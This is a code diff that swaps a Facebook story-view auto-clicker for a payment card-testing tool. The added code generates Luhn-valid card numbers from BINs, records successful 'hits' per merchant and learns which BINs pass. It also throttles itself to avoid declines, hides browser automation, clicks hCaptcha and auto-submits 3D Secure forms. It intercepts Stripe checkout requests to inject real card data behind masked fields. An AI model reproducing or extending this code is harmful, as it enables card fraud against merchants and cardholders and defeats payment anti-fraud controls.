-                        if not self.is_running:
-                            break
-                        self.log_message(f'🌐 Profile {profile_num} - Processing URL {url_index}')
-                        self.process_url_with_timing(driver, url, url_index)
-                    
-                    # Close profile when done
-                    self.close_profile(profile_num)
-                else:
-                    self.log_message(f'❌ Failed to open Profile {profile_num}')
-            
-            cycle_delay_minutes = self.cycle_delay.get()
-            if self.is_running and cycle_delay_minutes > 0:
-                delay_seconds = cycle_delay_minutes * 60
-                self.log_message(f'⏰ Cycle delay: waiting {cycle_delay_minutes} minute(s) before next cycle...')
-                elapsed = 0
-                while elapsed < delay_seconds and self.is_running:
-                    time.sleep(1)
-                    elapsed += 1
-                if self.is_running:
-                    self.log_message('🔁 Restarting automation cycle...')
-                    self.run_automation()
-                    return
-
-            self.is_running = False
-            self.start_button.config(state='normal')
-            self.stop_button.config(state='disabled')
-            self.log_message('🏁 AUTOMATION COMPLETED')
-            
-        except Exception as e:
-            self.log_message(f'❌ ERROR: {str(e)}')
-            self.is_running = False
-            self.start_button.config(state='normal')
-            self.stop_button.config(state='disabled')
-
-    def open_profile(self, profile_num):
-        """Open iX Browser profile"""
-        try:
-            self.log_message(f'🔧 Opening Profile {profile_num} via API...')
-            data = {'profile_id': profile_num}
-            
-            # Use your specific API endpoint
-            response = requests.post(f'{self.api_url.get()}/api/v2/profile-open', json=data, timeout=10)
-            
-            if response.status_code == 200:
-                result = response.json()
-                error_obj = result.get('error')
-                
-                # Check if profile started successfully
-                if error_obj is None or error_obj == '' or (isinstance(error_obj, dict) and error_obj.get('code') == 0):
-                    data_obj = result.get('data', {})
-                    debugging_address = data_obj.get('debugging_address')
-                    
-                    if debugging_address:
-                        chrome_options = Options()
-                        chrome_options.add_experimental_option('debuggerAddress', debugging_address)
-                        
-                        try:
-                            driver = webdriver.Chrome(options=chrome_options)
-                            time.sleep(3)
-                            self.log_message(f'🌐 Profile {profile_num} browser connected!')
-                            return driver
-                        except Exception as e:
-                            self.log_message(f'❌ WebDriver error for Profile {profile_num}: {str(e)}')
-                    else:
-                        self.log_message(f'❌ No debugging address for Profile {profile_num}')
-                else:
-                    self.log_message(f'❌ Profile {profile_num} API error: {error_obj}')
-            else:
-                self.log_message(f'❌ Profile {profile_num} API failed: {response.status_code}')
-                
-        except Exception as e:
-            self.log_message(f'❌ Error opening Profile {profile_num}: {str(e)}')
-        
+    @staticmethod
+    def extract_amount(html: str) -> Optional[str]:
+        script_data = URLAnalyzer._extract_from_scripts(html)
+        if script_data.get('amount') is not None:
+            amount_cents = script_data['amount']
+            if isinstance(amount_cents, (int, float)):
+                return f"${amount_cents/100:.2f}"
+        patterns = [
+            r'"amount":(\d+)',
+            r'"amount_display":"([^"]+)"',
+            r'\$(\d+(?:\.\d{2})?)',
+            r'data-amount="(\d+)"',
+            r'<span[^>]*class="[^"]*amount[^"]*"[^>]*>\s*[\$€£]?\s*([\d,]+\.?\d*)\s*</span>',
+            r'Total:?\s*[\$€£]?\s*([\d,]+\.?\d*)',
+            r'price["\']\s*:\s*["\']?\$?([\d,]+\.?\d*)',
+            r'"line_items":\[.*?"amount":(\d+).*?\]',
+            r'"amount_subtotal":(\d+)',
+            r'"total":(\d+)'
+        ]
+        for pattern in patterns:
+            match = re.search(pattern, html, re.IGNORECASE)
+            if match:
+                amount = match.group(1).replace(',', '')
+                if amount.isdigit() and len(amount) > 2:
+                    return f"${int(amount)/100:.2f}"
+                elif amount.replace('.', '').isdigit():
+                    return f"${amount}"
         return None
 
-    def close_profile(self, profile_num):
-        """Close iX Browser profile using your API endpoint"""
+    @staticmethod
+    def extract_product_name(html: str) -> Optional[str]:
+        script_data = URLAnalyzer._extract_from_scripts(html)
+        if script_data.get('product'):
+            return script_data['product']
+        patterns = [
+            r'"name":"([^"]+)"',
+            r'<title>(.*?)</title>',
+            r'<h1[^>]*>(.*?)</h1>',
+            r'"description":"([^"]+)"',
+            r'"product_name":"([^"]+)"',
+            r'<meta property="og:title" content="([^"]+)"',
+        ]
+        for pattern in patterns:
+            match = re.search(pattern, html, re.IGNORECASE)
+            if match:
+                name = match.group(1).strip()
+                name = re.sub(r'\s*[|–-]\s*Stripe.*$', '', name, flags=re.IGNORECASE)
+                name = re.sub(r'\s*[|–-]\s*Checkout.*$', '', name, flags=re.IGNORECASE)
+                if name and len(name) > 3:
+                    return name[:100]
+        return None
+
+    @staticmethod
+    def extract_product_url(html: str) -> Optional[str]:
+        script_data = URLAnalyzer._extract_from_scripts(html)
+        if script_data.get('product_url'):
+            return script_data['product_url']
+        patterns = [
+            r'<meta property="og:url" content="([^"]+)"',
+            r'<link rel="canonical" href="([^"]+)"',
+            r'"product_url":"([^"]+)"',
+            r'<a[^>]*href="([^"]+)"[^>]*>.*?product.*?</a>',
+        ]
+        for pattern in patterns:
+            match = re.search(pattern, html, re.IGNORECASE)
+            if match:
+                url = match.group(1).strip()
+                if url.startswith('http'):
+                    return url
+        return None
+
+    @staticmethod
+    def extract_merchant(html: str) -> str:
+        script_data = URLAnalyzer._extract_from_scripts(html)
+        if script_data.get('merchant'):
+            return script_data['merchant']
+        patterns = [
+            r'"business_name":"([^"]+)"',
+            r'<title>(.*?)\s*[|–-]\s*(Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|Mollie|Klarna|Authorize\.Net|WooCommerce|BigCommerce|Wix|Ecwid)',
+            r'"display_name":"([^"]+)"',
+            r'<meta property="og:site_name" content="([^"]+)"',
+        ]
+        for pattern in patterns:
+            match = re.search(pattern, html, re.IGNORECASE)
+            if match:
+                return match.group(1).strip()
+        return "Unknown"
+
+    @staticmethod
+    def extract_currency(html: str) -> str:
+        patterns = [
+            r'"currency":"([^"]+)"',
+            r'data-currency="([^"]+)"',
+        ]
+        for pattern in patterns:
+            match = re.search(pattern, html, re.IGNORECASE)
+            if match:
+                return match.group(1).upper()
+        return "USD"
+
+    @staticmethod
+    async def deep_analyze_with_playwright(url: str) -> Dict:
+        result = {
+            'merchant': 'Unknown',
+            'product': 'Unknown',
+            'product_url': None,
+            'amount': None,
+            'currency': 'USD',
+            'success': False
+        }
         try:
-            self.log_message(f'🔧 Closing Profile {profile_num} via API...')
-            data = {'profile_id': profile_num}
-            response = requests.post(f'{self.api_url.get()}/api/v2/profile-close', json=data, timeout=5)
-            
-            if response.status_code == 200:
-                self.log_message(f'✅ Profile {profile_num} closed successfully')
+            async with async_playwright() as p:
+                browser = await p.chromium.launch(
+                    headless=True,
+                    args=['--disable-blink-features=AutomationControlled', '--no-sandbox']
+                )
+                context = await browser.new_context(ignore_https_errors=True)
+                page = await context.new_page()
+                await page.goto(url, timeout=60000, wait_until='domcontentloaded')
+                await asyncio.sleep(3)
+
+                merchant = await page.evaluate(
+                    r"""() => {
+                    const meta = document.querySelector('meta[property="og:site_name"]');
+                    if (meta) return meta.content;
+                    const title = document.title;
+                    const match = title.match(/(.+?)\s*[|\u2013-]\s*(Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|Mollie|Klarna|Authorize\.Net|WooCommerce|BigCommerce|Wix|Ecwid)/);
+                    if (match) return match[1];
+                    return title;
+                }"""
+                )
+                if merchant and merchant not in ['Stripe Checkout', 'Checkout', 'Shopify Checkout', 'PayPal']:
+                    result['merchant'] = merchant.strip()
+
+                product = await page.evaluate('''() => {
+                    const meta = document.querySelector('meta[property="og:title"]');
+                    if (meta) return meta.content;
+                    const h1 = document.querySelector('h1');
+                    if (h1) return h1.innerText;
+                    return document.title;
+                }''')
+                if product and product not in ['Stripe Checkout', 'Checkout', 'Shopify Checkout']:
+                    result['product'] = product.strip()
+
+                product_url = await page.evaluate('''() => {
+                    const meta = document.querySelector('meta[property="og:url"]');
+                    if (meta) return meta.content;
+                    const link = document.querySelector('link[rel="canonical"]');
+                    if (link) return link.href;
+                    return null;
+                }''')
+                if product_url:
+                    result['product_url'] = product_url
+
+                amount_text = await page.evaluate('''() => {
+                    const selectors = ['[data-amount]', '.amount', '.price', '[class*="amount"]', '[class*="price"]'];
+                    for (let sel of selectors) {
+                        const el = document.querySelector(sel);
+                        if (el) {
+                            let text = el.innerText || el.getAttribute('data-amount');
+                            if (text) return text;
+                        }
+                    }
+                    return null;
+                }''')
+                if amount_text:
+                    match = re.search(r'[\$€£]?\s*([\d,]+\.?\d*)', amount_text)
+                    if match:
+                        amount = match.group(1).replace(',', '')
+                        result['amount'] = f"${amount}"
+
+                currency = await page.evaluate('''() => {
+                    const meta = document.querySelector('meta[property="og:price:currency"]');
+                    if (meta) return meta.content;
+                    const el = document.querySelector('[data-currency]');
+                    if (el) return el.getAttribute('data-currency');
+                    return null;
+                }''')
+                if currency:
+                    result['currency'] = currency.upper()
+
+                result['success'] = True
+                await browser.close()
+        except Exception as e:
+            result['error'] = str(e)
+        return result
+
+    @staticmethod
+    async def analyze_url_with_fallback(url: str, use_deep: bool = False) -> Dict:
+        result = {
+            'url': url,
+            'merchant': 'Unknown',
+            'product': 'Unknown',
+            'product_url': None,
+            'amount': None,
+            'currency': 'USD',
+            'success': False,
+            'error': None
+        }
+        try:
+            headers = {'User-Agent': random.choice(USER_AGENTS), 'Accept-Language': 'en-US,en;q=0.9'}
+            resp = requests.get(url, timeout=15, verify=False, headers=headers, allow_redirects=True)
+            if resp.status_code == 200:
+                html = resp.text
+                result['merchant'] = URLAnalyzer.extract_merchant(html)
+                result['product'] = URLAnalyzer.extract_product_name(html) or 'Unknown'
+                result['product_url'] = URLAnalyzer.extract_product_url(html)
+                result['amount'] = URLAnalyzer.extract_amount(html)
+                result['currency'] = URLAnalyzer.extract_currency(html)
+                result['success'] = True
             else:
-                self.log_message(f'⚠️ Profile {profile_num} close API returned: {response.status_code}')
-                
+                result['error'] = f"HTTP {resp.status_code}"
         except Exception as e:
-            self.log_message(f'⚠️ Error closing Profile {profile_num}: {str(e)}')
+            result['error'] = str(e)
 
-    def process_url_with_timing(self, driver, url, url_index):
-        """Process clicking on a specific URL with exact timing - FIXED STORY VIEW LOGIC"""
-        try:
-            self.log_message(f'🌐 Navigating to URL {url_index}: {url}')
-            driver.get(url)
-            self.log_message(f'✅ Navigated to URL {url_index}')
-            
-            self.log_message('⚡ Waiting 5 seconds for page load...')
-            time.sleep(5)
-            
-            # Check if we're on Facebook profile page
-            current_url = driver.current_url
-            self.log_message(f'🔍 Current URL: {current_url}')
-            
-            if 'facebook.com' in current_url:
-                self.log_message('✅ Successfully on Facebook page')
-                
-                # IMPROVED STORY VIEW LOGIC
-                if self.click_story_elements_improved(driver, url_index):
-                    self.log_message(f'🎉 Successfully completed story view for URL {url_index}')
-                else:
-                    self.log_message(f'❌ Failed to complete story view for URL {url_index}')
-            else:
-                self.log_message('❌ Not on Facebook page, skipping...')
-                
-        except Exception as e:
-            self.log_message(f'❌ Error processing URL {url_index}: {str(e)}')
+        if use_deep and (result['merchant'] == 'Unknown' or result['product'] in ['Stripe Checkout', 'Checkout', 'Shopify Checkout']):
+            deep = await URLAnalyzer.deep_analyze_with_playwright(url)
+            if deep['success']:
+                if deep['merchant'] != 'Unknown':
+                    result['merchant'] = deep['merchant']
+                if deep['product'] != 'Unknown':
+                    result['product'] = deep['product']
+                if deep['product_url']:
+                    result['product_url'] = deep['product_url']
+                if deep['amount']:
+                    result['amount'] = deep['amount']
+                if deep['currency'] != 'USD':
+                    result['currency'] = deep['currency']
+        return result
 
-    def click_story_elements_improved(self, driver, url_index):
-        """IMPROVED STORY VIEW LOGIC - Fixed version"""
-        try:
-            self.log_message('🖱️ Starting improved story view process...')
-            
-            # Step 1: Find and click story ring
-            self.log_message('🔍 Looking for story ring...')
-            story_ring_found = False
-            
-            # Multiple selectors for story ring
-            story_ring_selectors = [
-                "circle[class*='x1n2onr6']",
-                "circle[class*='x1n2onr6'][r='28']",
-                "circle[cx='50'][cy='50']",
-                "svg[aria-label*='Story'] circle",
-                "div[role='button'] svg circle",
-                "a[role='link'] svg circle"
-            ]
-            
-            for selector in story_ring_selectors:
-                try:
-                    elements = driver.find_elements(By.CSS_SELECTOR, selector)
-                    if elements:
-                        story_ring = elements[0]
-                        driver.execute_script("arguments[0].click();", story_ring)
-                        self.log_message(f'✅ Story ring clicked with selector: {selector}')
-                        story_ring_found = True
-                        break
-                except:
-                    continue
-            
-            if not story_ring_found:
-                self.log_message('❌ Story ring not found')
-                return False
-            
-            self.log_message('⚡ Waiting 3 seconds for story to open...')
-            time.sleep(3)
-            
-            # Step 2: Check if we're in story viewer
-            current_url = driver.current_url
-            if 'stories' in current_url.lower() or 'story' in current_url.lower():
-                self.log_message('✅ Successfully entered story viewer')
-                
-                # Step 3: Perform multiple clicks/likes on the story
-                self.log_message(f'🔄 Performing {self.click_count.get()} clicks on story...')
-                clicks_performed = 0
-                
-                for i in range(self.click_count.get()):
-                    if not self.is_running:
-                        break
-                    
-                    # Try multiple like button selectors
-                    like_selectors = [
-                        "svg[aria-label*='Like']",
-                        "svg[aria-label*='like']",
-                        "div[aria-label*='Like']",
-                        "div[aria-label*='like']",
-                        "button[aria-label*='Like']",
-                        "button[aria-label*='like']",
-                        "div[role='button'] svg",
-                        "button svg"
-                    ]
-                    
-                    like_clicked = False
-                    for selector in like_selectors:
-                        try:
-                            like_buttons = driver.find_elements(By.CSS_SELECTOR, selector)
-                            if like_buttons:
-                                like_button = like_buttons[0]
-                                driver.execute_script("arguments[0].click();", like_button)
-                                self.log_message(f'✅ Like click {i+1} performed')
-                                clicks_performed += 1
-                                self.update_total_clicks()
-                                like_clicked = True
-                                break
-                        except:
-                            continue
-                    
-                    if not like_clicked:
-                        # If no like button found, try clicking on the story area
-                        try:
-                            story_area = driver.find_element(By.CSS_SELECTOR, "div[role='main']")
-                            driver.execute_script("arguments[0].click();", story_area)
-                            self.log_message(f'✅ Story area click {i+1} performed')
-                            clicks_performed += 1
-                            self.update_total_clicks()
-                        except:
-                            pass
-                    
-                    # Wait between clicks
-                    time.sleep(self.click_delay.get())
-                
-                self.log_message(f'🎉 Completed {clicks_performed} clicks on story')
-                return True
-            else:
-                self.log_message('❌ Not in story viewer')
-                return False
-                
-        except Exception as e:
-            self.log_message(f'❌ Error in story view process: {str(e)}')
-            return False
+# ============= DATABASE SETUP =============
+def init_db(db_path: str = DATABASE):
+    conn = sqlite3.connect(db_path)
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS bins (id INTEGER PRIMARY KEY AUTOINCREMENT, bin TEXT)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS cards (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        card_number TEXT, month TEXT, year TEXT, cvv TEXT,
+        success_count INTEGER DEFAULT 0, fail_count INTEGER DEFAULT 0
+    )''')
+    c.execute('''CREATE TABLE IF NOT EXISTS hits (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        timestamp TEXT, card TEXT, merchant TEXT, product TEXT, amount TEXT,
+        success INTEGER, decline_code TEXT, receipt_url TEXT, response_time REAL
+    )''')
+    c.execute('''CREATE TABLE IF NOT EXISTS patterns (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        merchant TEXT, bin_pattern TEXT, success_count INTEGER DEFAULT 0, fail_count INTEGER DEFAULT 0
+    )''')
+    conn.commit()
+    conn.close()
 
-    def resize_profile_window(self, profile_num):
-        """Resize profile window to selected size"""
-        try:
-            selected_size = self.window_size.get()
-            if selected_size:
-                width, height = map(int, selected_size.split('x'))
-                self.log_message(f'🎯 Profile {profile_num} - Resizing to: {width}x{height}')
-                self.resize_window_to_size(profile_num, width, height)
-                self.log_message(f'✅ Profile {profile_num} - Resized successfully!')
-        except Exception as e:
-            self.log_message(f'⚠️ Error resizing Profile {profile_num} window: {str(e)}')
+# ============= FINGERPRINT =============
+class FingerprintGenerator:
+    @staticmethod
+    def generate() -> Dict:
+        return {
+            'user_agent': random.choice(USER_AGENTS),
+            'viewport': {'width': 1920, 'height': 1080},
+            'locale': 'en-US',
+            'timezone_id': 'America/New_York'
+        }
 
-    def resize_window_to_size(self, profile_num, width, height):
-        """Window ko specific size mein resize karta hai"""
-        try:
-            import pygetwindow as gw
-            browser_windows = []
-            for window in gw.getAllWindows():
-                if f'Profile {profile_num}' in window.title or 'iX Browser' in window.title:
-                    browser_windows.append(window)
-            
-            if browser_windows:
-                window = browser_windows[0]
-                window.resizeTo(width, height)
-                self.log_message(f'✅ Profile {profile_num} - Window resized to {width}x{height}')
-            return None
-        except Exception as e:
-            self.log_message(f'❌ Window resize failed for Profile {profile_num}: {str(e)}')
+    @staticmethod
+    def get_stealth_script() -> str:
+        return """
+        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
+        window.chrome = { runtime: {} };
+        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
+        """
 
-    def get_urls_from_input(self):
-        """URLs from text input get karta hai"""
-        try:
-            all_text = self.urls_text.get(1.0, tk.END).strip()
-            all_lines = all_text.split('\n')
-            
-            # Filter out empty lines and lines that don't look like URLs
-            urls = []
-            for line in all_lines:
-                line = line.strip()
-                if line and ('http://' in line or 'https://' in line or 'facebook.com' in line):
-                    # Ensure it's a proper URL
-                    if not line.startswith(('http://', 'https://')):
-                        line = 'https://' + line
-                    urls.append(line)
-            
-            self.log_message(f'📝 Found {len(urls)} valid URLs')
-            return urls
-        except Exception as e:
-            self.log_message(f'❌ URL input error: {str(e)}')
-            return []
+# ============= CARD PATTERN LEARNER =============
+class CardPatternLearner:
+    def __init__(self):
+        self.patterns: Dict[str, Dict[str, Dict]] = defaultdict(dict)
 
-    def start_turbo_mode(self):
-        """Turbo mode - Threaded to prevent freeze"""
-        try:
-            import threading
-            turbo_thread = threading.Thread(target=self._turbo_mode_worker)
-            turbo_thread.daemon = True
-            turbo_thread.start()
-        except Exception as e:
-            self.log_message(f'❌ Turbo mode thread error: {str(e)}')
-
-    def _turbo_mode_worker(self):
-        """Turbo mode worker thread with batch processing"""
-        try:
-            self.log_message('🚀 TURBO MODE ACTIVATED!')
-            self.is_running = True
-            self.start_button.config(state='disabled')
-            self.stop_button.config(state='normal')
-            
-            self.log_message('🔍 Starting turbo mode in background thread...')
-            urls = self.get_urls_from_input()
-            if not urls:
-                self.log_message('❌ No URLs found!')
-                self.is_running = False
-                self.start_button.config(state='normal')
-                self.stop_button.config(state='disabled')
-                return
-            
-            # Use the same automation logic but with faster processing
-            self.run_automation()
-                
-        except Exception as e:
-            self.log_message(f'❌ Turbo mode worker error: {str(e)}')
-            self.is_running = False
-            self.start_button.config(state='normal')
-            self.stop_button.config(state='disabled')
-
-    def auto_arrange_windows(self):
-        """Smart resize tiled layout auto arrange windows"""
-        try:
-            import pygetwindow as gw
-            browser_windows = []
-            for window in gw.getAllWindows():
-                if 'iX Browser' in window.title or 'Chrome' in window.title or 'Facebook' in window.title:
-                    browser_windows.append(window)
-            
-            if not browser_windows:
-                self.log_message('❌ No browser windows found!')
-                return None
-            
-            self.log_message(f'🖼️ Auto arranging {len(browser_windows)} windows...')
-            
-            screen_width = self.screen_width
-            screen_height = self.screen_height
-            
-            if len(browser_windows) == 1:
-                # Single window - center it
-                window = browser_windows[0]
-                window.resizeTo(400, 600)
-                window.moveTo(screen_width//2 - 200, screen_height//2 - 300)
-                
-            else:
-                # Multiple windows - arrange in grid
-                import math
-                cols = math.ceil(math.sqrt(len(browser_windows)))
-                rows = math.ceil(len(browser_windows) / cols)
-                
-                window_width = screen_width // cols
-                window_height = screen_height // rows
-                
-                for i, window in enumerate(browser_windows):
-                    row = i // cols
-                    col = i % cols
-                    x = col * window_width
-                    y = row * window_height
-                    
-                    window.resizeTo(window_width, window_height)
-                    window.moveTo(x, y)
-            
-            self.log_message('✅ Windows arranged successfully!')
-            
-        except Exception as e:
-            self.log_message(f'❌ Smart resize tiled arrangement failed: {str(e)}')
-
-    def _parse_interval_seconds(self):
-        """Convert auto-arrange interval string to seconds"""
-        interval_str = self.auto_arrange_interval.get()
-        try:
-            parts = interval_str.split()
-            value = int(parts[0])
-            unit = parts[1] if len(parts) > 1 else 'seconds'
-            if 'minute' in unit:
-                return value * 60
-            return value
-        except Exception:
-            return 60
-
-    def _schedule_auto_arrange(self):
-        """Schedule next auto-arrange run if still enabled"""
-        if not self.auto_arrange_enabled.get():
-            return
-        self.auto_arrange_windows()
-        interval_ms = self._parse_interval_seconds() * 1000
-        self._auto_arrange_timer = self.root.after(interval_ms, self._schedule_auto_arrange)
-
-    def toggle_auto_arrange(self):
-        """Auto arrange checkbox toggle karta hai"""
-        if self.auto_arrange_enabled.get():
-            self.log_message('🔄 Auto Arrange enabled!')
-            if self._auto_arrange_timer is not None:
-                self.root.after_cancel(self._auto_arrange_timer)
-                self._auto_arrange_timer = None
-            interval_ms = self._parse_interval_seconds() * 1000
-            self._auto_arrange_timer = self.root.after(interval_ms, self._schedule_auto_arrange)
+    def learn(self, card: Dict, merchant: str, success: bool):
+        bin_pattern = card['card'][:6]
+        if merchant not in self.patterns:
+            self.patterns[merchant] = {}
+        if bin_pattern not in self.patterns[merchant]:
+            self.patterns[merchant][bin_pattern] = {'success': 0, 'fail': 0}
+        if success:
+            self.patterns[merchant][bin_pattern]['success'] += 1
         else:
-            self.log_message('⏹️ Auto Arrange disabled!')
-            if self._auto_arrange_timer is not None:
-                self.root.after_cancel(self._auto_arrange_timer)
-                self._auto_arrange_timer = None
+            self.patterns[merchant][bin_pattern]['fail'] += 1
 
-if __name__ == '__main__':
-    root = tk.Tk()
-    app = IXStoryViewTool(root)
-    root.mainloop()
+    def suggest_best_pattern(self, merchant: str) -> Optional[str]:
+        if merchant not in self.patterns:
+            return None
+        best = None
+        best_rate = -1
+        for pattern, data in self.patterns[merchant].items():
+            total = data['success'] + data['fail']
+            if total > 0:
+                rate = data['success'] / total * 100
+                if rate > best_rate and data['success'] >= 2:
+                    best_rate = rate
+                    best = pattern
+        return best
+
+# ============= SMART RATE LIMITER =============
+class SmartRateLimiter:
+    def __init__(self):
+        self.current_delay = 1.0
+        self.consecutive_failures = 0
+
+    def calculate_delay(self, last_result: str) -> float:
+        if last_result == 'success':
+            self.consecutive_failures = 0
+            self.current_delay = max(0.5, self.current_delay * 0.9)
+        elif last_result == 'declined':
+            self.consecutive_failures += 1
+            self.current_delay = min(8, self.current_delay * 1.2 + self.consecutive_failures * 0.2)
+        return max(0.5, min(10, self.current_delay))
+
+# ============= CARD GENERATOR =============
+class CardGenerator:
+    @staticmethod
+    def get_card_brand(card_number: str) -> str:
+        first6 = re.sub(r'\D', '', card_number)[:6]
+        if re.match(r'^3[47]', first6): return 'amex'
+        if re.match(r'^5[1-5]', first6) or re.match(r'^2[2-7]', first6): return 'mastercard'
+        if re.match(r'^4', first6): return 'visa'
+        return 'unknown'
+
+    @staticmethod
+    def luhn_checksum(card_number: str) -> int:
+        def digits_of(n): return [int(d) for d in str(n)]
+        digits = digits_of(card_number)
+        odd_digits = digits[-1::-2]
+        even_digits = digits[-2::-2]
+        checksum = sum(odd_digits)
+        for d in even_digits:
+            checksum += sum(digits_of(d * 2))
+        return checksum % 10
+
+    @staticmethod
+    def generate_card(bin_number: str) -> Optional[Dict]:
+        if not bin_number or len(bin_number) < 4:
+            return None
+
+        parts = bin_number.split('|')
+        bin_pattern = re.sub(r'[^0-9xX]', '', parts[0])
+        test_bin = bin_pattern.replace('x', '0').replace('X', '0')
+        brand = CardGenerator.get_card_brand(test_bin)
+
+        target_len = 15 if brand == 'amex' else 16
+        cvv_len = 4 if brand == 'amex' else 3
+
+        card = ''
+        for c in bin_pattern:
+            card += str(random.randint(0, 9)) if c.lower() == 'x' else c
+
+        remaining = target_len - len(card) - 1
+        for _ in range(remaining):
+            card += str(random.randint(0, 9))
+
+        check_digit = 0
+        for i in range(10):
+            if CardGenerator.luhn_checksum(card + str(i)) == 0:
+                check_digit = i
+                break
+
+        full_card = card + str(check_digit)
+
+        month = f"{random.randint(1, 12):02d}"
+        if len(parts) > 1 and parts[1]:
+            month = parts[1].zfill(2) if parts[1].lower() != 'xx' else f"{random.randint(1, 12):02d}"
+
+        year = f"{datetime.now().year + random.randint(1, 5):02d}"
+        if len(parts) > 2 and parts[2]:
+            year = parts[2].zfill(2) if parts[2].lower() != 'xx' else f"{datetime.now().year + random.randint(1, 5):02d}"
+
+        cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_len))
+        if len(parts) > 3 and parts[3]:
+            if parts[3].lower() in ('xxx', 'xxxx'):
+                cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_len))
+            else:
+                cvv = parts[3].zfill(cvv_len)
+
+        return {'card': full_card, 'month': month, 'year': year, 'cvv': cvv, 'brand': brand}
+
+    @staticmethod
+    def generate_cards(bin_number: str, count: int = 10) -> List[Dict]:
+        cards = []
+        for _ in range(count):
+            card = CardGenerator.generate_card(bin_number)
+            if card:
+                cards.append(card)
+        return cards
+
+    @staticmethod
+    def parse_card_string(card_str: str) -> Optional[Dict]:
+        """Parse a cc|mm|yy|cvv string into a card dict."""
+        parts = card_str.strip().split('|')
+        if len(parts) == 4:
+            return {
+                'card': parts[0].strip(),
+                'month': parts[1].strip().zfill(2),
+                'year': parts[2].strip().zfill(2),
+                'cvv': parts[3].strip(),
+                'brand': CardGenerator.get_card_brand(parts[0].strip())
+            }
+        return None
+
+# ============= BASE AUTOFILL CLASS =============
+class BaseAutofill:
+    def __init__(self, page: Page):
+        self.page = page
+        self.real_card = None
+
+    async def enable_card_replace(self, real_card: Dict):
+        self.real_card = real_card
+
+    async def fill_card(self, card: Dict):
+        pass
+
+    async def submit(self) -> bool:
+        return False
+
+    async def detect_3ds(self) -> bool:
+        iframes = await self.page.query_selector_all('iframe[src*="3ds"], iframe[src*="challenge"]')
+        for iframe in iframes:
+            if await iframe.is_visible():
+                return True
+        text = await self.page.text_content('body')
+        if '3D Secure' in text or 'Authentication' in text:
+            return True
+        return False
+
+    async def wait_for_3ds(self, timeout: int = 10000) -> bool:
+        start = time.time()
+        while (time.time() - start) * 1000 < timeout:
+            if await self.detect_3ds():
+                return True
+            await asyncio.sleep(0.5)
+        return False
+
+    async def auto_complete_3ds(self) -> bool:
+        if not await self.detect_3ds():
+            return False
+        form = await self.page.query_selector('form')
+        if form:
+            await form.evaluate('form => form.submit()')
+            await asyncio.sleep(3)
+            return True
+        cont = await self.page.query_selector('button:has-text("Continue"), button:has-text("Submit")')
+        if cont:
+            await cont.click()
+            await asyncio.sleep(3)
+            return True
+        return False
+
+    async def handle_captcha(self):
+        try:
+            frame = self.page.frame_locator('iframe[src*="hcaptcha.com"]')
+            if frame:
+                checkbox = frame.locator('#checkbox').first
+                if await checkbox.is_visible():
+                    await checkbox.click()
+                    await asyncio.sleep(2)
+                    return True
+        except Exception:
+            pass
+        return False
+
+    async def find_and_fill_field(self, selectors: List[str], value: str):
+        for sel in selectors:
+            try:
+                element = await self.page.query_selector(sel)
+                if element and await element.is_visible():
+                    await element.click()
+                    await element.fill(value)
+                    return True
+            except Exception:
+                continue
+        return False
+
+# ============= STRIPE AUTOFILL =============
+class StripeAutofill(BaseAutofill):
+    CARD_SELECTORS = [
+        '#cardNumber', '[name="cardNumber"]', '[autocomplete="cc-number"]',
+        '[data-elements-stable-field-name="cardNumber"]',
+        'input[placeholder*="Card number"]', 'input[placeholder*="card number"]',
+        'input[aria-label*="Card number"]', '[class*="CardNumberInput"] input',
+        'input[name="number"]', 'input[id*="card-number"]'
+    ]
+    EXPIRY_SELECTORS = [
+        '#cardExpiry', '[name="cardExpiry"]', '[autocomplete="cc-exp"]',
+        '[data-elements-stable-field-name="cardExpiry"]',
+        'input[placeholder*="MM / YY"]', 'input[placeholder*="MM/YY"]',
+        'input[placeholder*="MM"]', '[class*="CardExpiry"] input'
+    ]
+    CVC_SELECTORS = [
+        '#cardCvc', '[name="cardCvc"]', '[autocomplete="cc-csc"]',
+        '[data-elements-stable-field-name="cardCvc"]',
+        'input[placeholder*="CVC"]', 'input[placeholder*="CVV"]',
+        '[class*="CardCvc"] input', 'input[name="cvc"]'
+    ]
+    NAME_SELECTORS = [
+        '#billingName', '[name="billingName"]', '[autocomplete="cc-name"]',
+        'input[placeholder*="Name on card"]', 'input[name="name"]'
+    ]
+    EMAIL_SELECTORS = [
+        'input[type="email"]', 'input[name*="email"]', 'input[autocomplete="email"]',
+        'input[placeholder*="email"]'
+    ]
+    SUBMIT_SELECTORS = [
+        '.SubmitButton', '[class*="SubmitButton"]', 'button[type="submit"]',
+        '[data-testid*="submit"]', 'button:has-text("Pay")'
+    ]
+    MASKED_CARD = "0000000000000000"
+    MASKED_EXPIRY = "01/30"
+    MASKED_CVV = "000"
+
+    async def enable_card_replace(self, real_card: Dict):
+        self.real_card = real_card
+
+        async def intercept_route(route: Route, request: Request):
+            if request.method == "POST" and "stripe.com" in request.url:
+                post_data = request.post_data
+                if post_data and self.real_card:
+                    post_data = post_data.replace("card[number]=0000000000000000", f"card[number]={self.real_card['card']}")
+                    post_data = post_data.replace("card[exp_month]=01", f"card[exp_month]={self.real_card['month']}")
+                    post_data = post_data.replace("card[exp_year]=30", f"card[exp_year]={self.real_card['year']}")
+                    post_data = post_data.replace("card[cvc]=000", f"card[cvc]={self.real_card['cvv']}")
+                    post_data = post_data.replace("card[expiry]=01/30", f"card[expiry]={self.real_card['month']}/{self.real_card['year']}")
+                    await route.continue_(post_data=post_data)
+                    return
+            await route.continue_()
+
+        await self.page.route("**/*", intercept_route)
+
+    async def fill_card(self, card: Dict):
+        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
+        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
+        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
+        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
+        email = f"dlx{random.randint(100, 9999)}@example.com"
